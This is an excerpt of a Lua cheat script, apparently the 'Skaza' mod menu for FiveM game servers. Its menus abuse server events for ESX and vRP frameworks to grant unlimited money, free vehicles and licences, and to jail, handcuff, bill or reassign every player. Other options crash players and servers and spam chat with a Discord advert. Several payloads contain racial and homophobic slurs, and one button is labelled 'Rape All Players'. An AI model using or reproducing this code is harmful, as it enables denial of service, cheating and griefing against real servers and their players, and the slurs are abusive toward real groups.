...
local Enabled = true
piesaries = triggerserverevent
pizda = RequestModel
skazakc = KoGuSzEk
Ggggg = GetHashKey
llll4874 = enabled
KAKAAKAKAK = llll4874
dupajasia = HasModelLoaded
local states = {}
states.frozen = false
...
function Deer.Ride()
	...
	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_pig") then
		...
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_pig") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
                    ...
                    if cg then
                        if not DoesBlipExist(blip) then
                            ...
                            elseif veh then
                                ...
                                triggerrengers = GetVehicleNumberOftriggerrengers(veh)
                                if triggerrengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        triggerrengers = triggerrengers + 1
                                    end
                                    ShowNumberOnBlip(blip, triggerrengers)
                                else
...
local function fv()
    ...
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        ...
        piesaries('esx_vehicleshop:setVehicleOwned', cx)
    ...
    ESX.UI.Menu.Open(
      ...
      function(data, menu)
        ...
        if data.current.value ~= nil then
          ...
          piesaries('esx_mafiajob:confiscatePlayerItem', GetPlayerServerId(SelectedPlayer), itemType, itemName, amount)
...
function vrpdestroy()
                ...
                piesaries('vrp_slotmachine:server:2', 999999999)
                piesaries('Banca:deposit', 999999999)
                piesaries('bank:deposit', 999999999)
...
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoBiznes" }
...
local function debugPrint(text)
    if Biznes.debug then
        Citizen.Trace("[Biznes] "..tostring(text))
    end
end
...
function Biznes.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
    ...
    menus[id].titleBackgroundColor = { r = 64, g = 63, b = 63, a = 230 }
    ...
    menus[id].menuBackgroundColor = { r = 87, g = 87, b = 87, a = 180 }

    menus[id].subTitleBackgroundColor = { r = 64, g = 63, b = 63, a = 230 }
...
function Biznes.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        Biznes.CreateMenu(id, menus[parent].title)
...
function Biznes.CurrentMenu()
    return currentMenu
end


function Biznes.OpenMenu(id)
    if id and menus[id] then
...
function Biznes.IsMenuOpened(id)
    return isMenuVisible(id)
end


function Biznes.IsAnyMenuOpened()
...
function Biznes.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function Biznes.Button(text, subText)
...
function Biznes.MenuButton(text, id)
    if menus[id] then
        if Biznes.Button(text) then
            setMenuVisible(currentMenu, false)
...
function Biznes.CheckBox(text, checked, callback)
    if Biznes.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function Biznes.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if Biznes.Button(text, selectedItem) then
...
function Biznes.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function Biznes.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function Biznes.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function Biznes.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function Biznes.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function Biznes.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function Biznes.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function Biznes.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function Biznes.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function Biznes.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function Biznes.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function Biznes.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function Biznes.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function Biznes.SetMenuButtonPressedSound(id, name, set)
...
function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        piesaries('esx_jobs:caution', 'give_back', 9999999999)
                        piesaries('esx_fueldelivery:pay', 9999999999)
                        piesaries('esx_carthief:pay', 9999999999)
                        piesaries('esx_godirtyjob:pay', 9999999999)
                        piesaries('esx_pizza:pay', 9999999999)
                        piesaries('esx_ranger:pay', 9999999999)
                        piesaries('esx_garbagejob:pay', 9999999999)
                        piesaries('esx_truckerjob:pay', 9999999999)
                        piesaries('AdminMenu:giveBank', 9999999999)
                        piesaries('AdminMenu:giveCash', 9999999999)
                        piesaries('esx_gopostaljob:pay', 9999999999)
                        piesaries('esx_banksecurity:pay', 9999999999)
                        piesaries('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            piesaries(
                                '_chat:messageEntered',
                                'Skaza',
                        ...
                        for i = 0, 256 do
                            ...
                            piesaries('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            piesaries('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end
...
function RapeAllFunc()
    for bs=0,9 do
        piesaries("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
...
function teleportToNearestVehicle()
            ...
            local NearestBiznes = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestBiznesPos = GetEntityCoords(NearestBiznes, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestBiznes == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestBiznes ~= 0) then
            if IsVehicleSeatFree(NearestBiznes, -1) then
                SetPedIntoVehicle(playerPed, NearestBiznes, -1)
                SetVehicleAlarm(NearestBiznes, false)
                SetVehicleDoorsLocked(NearestBiznes, 1)
                SetVehicleNeedsToBeHotwired(NearestBiznes, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestBiznes, -1)
        ...
        elseif (NearestVehicle ~= 0) and (NearestBiznes == 0) then
            ...
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestBiznes ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestBiznesPos.x, NearestBiznesPos.y, NearestBiznesPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
            ...
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestBiznesPos.x, NearestBiznesPos.y, NearestBiznesPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestBiznes, -1) then
                    SetPedIntoVehicle(playerPed, NearestBiznes, -1)
                    SetVehicleAlarm(NearestBiznes, false)
                    SetVehicleDoorsLocked(NearestBiznes, 1)
...
function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOBiznes"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not dupajasia(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not dupajasia(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not dupajasia(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not dupajasia(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not dupajasia(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            piesaries("_chat:messageEntered","~r~",{141,211,255},"Skaza DSC https://discord.gg/s6Fu6vv")
        end
...
Citizen.CreateThread(
    function()
        while true do
			...
			if chatspam then
                piesaries(
                    ...
                    'Skaza',
                    {0, 0x99, 255},
                    '/ooc Skaza menu by at https://discord.gg/s6Fu6vv'
                )
                piesaries('_chat:messageEntered', 'Skaza', {0, 0x99, 255}, 'Skaza Menu https://discord.gg/s6Fu6vv :P')
            end
	
			if banallusers then
				for i = 0, 128 do
				piesaries("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				piesaries("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				piesaries("js:jailuser", GetPlayerServerId(i), 45 * 60, "Skaza Bejbe https://discord.gg/s6Fu6vv")
				piesaries("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Skaza Bejbe https://discord.gg/s6Fu6vv")
					end
				end
				...
				for i = 0, 128 do
						piesaries("esx_truckerjob:pay", 9999999999)
						piesaries("AdminMenu:giveCash", 9999999999)
						piesaries("esx_dmvschool:pay",  9999999999)
						piesaries("LegacyFuel:PayFuel", 9999999999)
				end
			end
			local triggerr = "nowela" 
            if invisible then
		...
		SetEntityVisible(ped, false);
			...
			if freezeall then
				for i = 0, 128 do
						piesaries("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						piesaries("CheckHandcuff", GetPlayerServerId(i))
						piesaries("cuffServer", GetPlayerServerId(i))
						piesaries("cuffGranted", GetPlayerServerId(i))
						piesaries("police:cuffGranted", GetPlayerServerId(i))
						piesaries("esx_handcuffs:cuffing", GetPlayerServerId(i))
						piesaries("esx_policejob:handcuff", GetPlayerServerId(i))
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Biznes.CreateMenu("MainMenu", "* SKAZA *")
        Biznes.CreateSubMenu("SelfMenu", "MainMenu", "Player Menu")
        Biznes.CreateSubMenu("DestroyServer", "MainMenu", "DestroyServer")
		Biznes.CreateSubMenu("SerweryPL", "MainMenu", "SerweryPL")
        Biznes.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        Biznes.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        Biznes.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        Biznes.CreateSubMenu("MaliciousMenu", "MainMenu", "SKAZAAAAA")
        Biznes.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        Biznes.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        Biznes.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        Biznes.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        Biznes.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        Biznes.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        Biznes.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		Biznes.CreateSubMenu("AI", "MainMenu", "AI Menu")
		Biznes.CreateSubMenu("Credits", "MainMenu", "Credits")
        Biznes.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        Biznes.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        Biznes.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        Biznes.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        Biznes.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        Biznes.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        Biznes.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        Biznes.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
		Biznes.CreateSubMenu("zmiana", "SerweryPL", "Zmien sie")
        Biznes.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
		Biznes.CreateSubMenu("pedyy", "MainMenu", "Pedy")
        Biznes.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        Biznes.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        Biznes.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        Biznes.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        Biznes.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        Biznes.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        Biznes.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        Biznes.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
        Biznes.CreateSubMenu("ESXEasy", "SerweryPL", "Zresp peda")

        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "SerweryPL", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "VRPMenu", "DestroyServer", "ESXEasy", "pedyy", "zmiana"}


        while Enabled do
            if Biznes.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Official ~s~Skaza")
                drawNotification("~h~~s~Biznes ~b~Szmato")
				drawNotification("~h~~b~Ed~b~yt~b~owane ~b~pr~b~z~b~ez: ~g~S~o~k~p~a~w~z~b~a~r~z ")
				if Biznes.Button('~h~~r~Twoj nick: <FONT COLOR="#8a0000">' .. GetPlayerName(PlayerId(-1)) .. '') then
                elseif Biznes.MenuButton    ("~b~» ~s~Twoje ~r~Opcje", "SelfMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Aktywni ~r~Gracze", "OnlinePlayersMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Ogolne ~r~Menu", "MaliciousMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Teleport ~r~Menu", "TeleportMenu") then             
                elseif Biznes.MenuButton("~b~» ~s~Bronie ~r~Menu", "WeaponMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Samochody ~r~Menu", "VehMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Trollowanie ~r~Menu", "TrollMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Menu ~r~Pedow", "pedyy") then
                elseif Biznes.MenuButton("~b~» ~g~Pieniadze ~r~Menu", "ESXMenu") then
                elseif Biznes.MenuButton("~b~» ~s~VRP ~r~Opcje", "VRPMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Zabawa", "AI") then 
				elseif Biznes.MenuButton("~b~» ~g~~h~Twórca", "Credits") then
                elseif Biznes.Button("~b~» ~h~~r~Wyłącz Menu") then
                    Enabled = false
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("VRPMenu") then
                if Biznes.Button("VRP PayGarage 100$") then
                    piesaries("lscustoms:payGarage", {costs = -100})
                elseif Biznes.Button("VRP PayGarage 1000$") then
                    piesaries("lscustoms:payGarage", {costs = -1000})
                elseif Biznes.Button("VRP PayGarage 10 000$") then
                    piesaries("lscustoms:payGarage", {costs = -10000})
                elseif Biznes.Button("VRP PayGarage 100 000$") then
                    piesaries("lscustoms:payGarage", {costs = -100000})
                elseif Biznes.Button("VRP Get Driver Licence") then
                    piesaries("dmv:success")
                elseif Biznes.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    piesaries("bank:deposit", amount)
                elseif Biznes.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    piesaries("bank:withdraw", amount)
                elseif Biznes.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    piesaries("vrp_slotmachine:server:2", amount)
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("TrollMenu") then
                if Biznes.Button("ESX Server Crasher") then
                    for i = 1, 50000 do piesaries("esx_skin:responseSaveSkin", {niggers = "gay"}) piesaries("esx_skin:responseSaveSkin", "niggers eat shit") end
                elseif  Biznes.CheckBox(
				...
				elseif Biznes.Button("SWAT W/ Railgun On Everyone") then
                    ...
                    for i = 0, 128 do
                        ...
                        Citizen.Wait(50)
                        if dupajasia(GetHashKey(swat)) then
                            local ped =
                ...
                elseif Biznes.Button("Nuke Server") then
                    nukeserver()
				elseif Biznes.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif Biznes.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                    ...
                    for i = 0, 128 do
                    piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name1, amount1)
                    end
				end
				elseif Biznes.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					piesaries('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
                end
				elseif Biznes.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif Biznes.Button("Rape All Players") then
                    RapeAllFunc()
                elseif Biznes.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif Biznes.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif Biznes.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif Biznes.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif Biznes.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif Biznes.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif Biznes.Button("Fake Message") then
                    local da=KeyboardInput("Enter player name","",100)
                    if da then
                        local ck=KeyboardInput("Enter message","",1000)
                        if ck then
                            piesaries("_chat:messageEntered",da,{0,0x99,255},ck)
                        end
                    end
                elseif Biznes.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        piesaries("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        piesaries("NB:recruterplayer", i, "police", 3)
                    end
                elseif Biznes.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        piesaries("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                        piesaries("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("TeleportMenu") then
                if Biznes.Button("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif Biznes.Button("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif Biznes.Button("Teleport To Coords") then
                    TeleportToCoords()
                elseif Biznes.CheckBox(
                    "Show Coords",
                    showCoords,
                ...
                Biznes.Display()
			elseif Biznes.IsMenuOpened("AI") then
			                if Biznes.Button("~h~Configure AI ~g~Speed") then
                ...
                elseif Biznes.Button("~h~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif Biznes.Button("~h~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif Biznes.Button("~h~Stop AI") then
                    ...
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ...
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				                ...
				                Biznes.Display()
            elseif Biznes.IsMenuOpened("VehMenu") then
                if Biznes.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif Biznes.Button("Repair Engine Only") then
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif Biznes.Button("~g~Buy vehicle for free") then fv()
					elseif
					Biznes.CheckBox(
				...
				then
                elseif Biznes.Button("Spawn a vehicle") then
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not dupajasia(ModelName) do
                            Citizen.Wait(0)
                        end
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Skaza")
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif Biznes.MenuButton("LS Customs", "LSC") then
				                elseif
                    Biznes.CheckBox(
                 ...
                 then
                elseif Biznes.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					Biznes.CheckBox(
						"No Fall",
				 ...
				 then
				elseif Biznes.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
			...
			then
				...
				Biznes.Display()
			elseif Biznes.IsMenuOpened("pedyy") then
				if Biznes.MenuButton("Respienie pedow", "ESXEasy") then
				elseif Biznes.MenuButton("Zmiana w peda", "zmiana") then
				end
				Biznes.Display()
			elseif Biznes.IsMenuOpened("zmiana") then
				if Biznes.Button("Pedzi na Swini") then
				Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
	 elseif Biznes.Button("Zamien w  ~r~SKAZE!") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_mtlion")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben12)
	while not dupajasia(keduxben12) do
        Wait(100)
    end
    ...
    SetModelAsNoLongerNeeded(keduxben12)
	 elseif Biznes.Button("Zamien w  ~r~Coyota") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_coyote")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~policje") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("s_m_y_cop_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~dzika") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_boar")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~jastrzab") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_cormorant")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~pudelka") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_poodle")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~lamara") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("cs_lamardavis")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~goryla") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("cs_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~ptaka") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_c_seagull")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~striptizerke") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("csb_stripper_02")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~doktorka") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("s_m_m_doctor_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~ochroniarza") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("s_m_y_doorman_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~grabarza") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("a_m_m_hasjew_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~wieznia") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("s_m_y_prisoner_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~bezdomnego") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("u_f_o_prolhost_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif Biznes.Button("Zamien w  ~r~ksiedza") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("cs_priest")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
    ...
    SetModelAsNoLongerNeeded(keduxben12)
				...
				Biznes.Display()
			elseif Biznes.IsMenuOpened("ESXEasy") then
				if Biznes.Button("Zresp koguty koguszka") then
						local bQ = 'a_c_hen'
						local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        ...
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if dupajasia(GetHashKey(bQ)) then
                            local ped =
                   ...
                   elseif Biznes.Button('~h~~r~Zresp ~r~customowego peda') then
                ...
                elseif Biznes.Button('~h~~r~Zresp ~w~SWAT z ~y~AK') then
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~wieloryba') then
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~pedofila jebanego w dupe') then
                    local bQ = 'cs_priest'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif Biznes.Button('~h~~r~Zresp ~w~SWAT z ~y~pistoletem na flary') then
                    local bQ = 's_m_y_swat_01'
                ...
                elseif Biznes.Button('~h~~r~Zresp ~w~SWAT z ~y~Railgunem') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_railgun'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~swinie') then
                    local bQ = 'a_c_pig'
                    local bR = 'weapon_rpg'
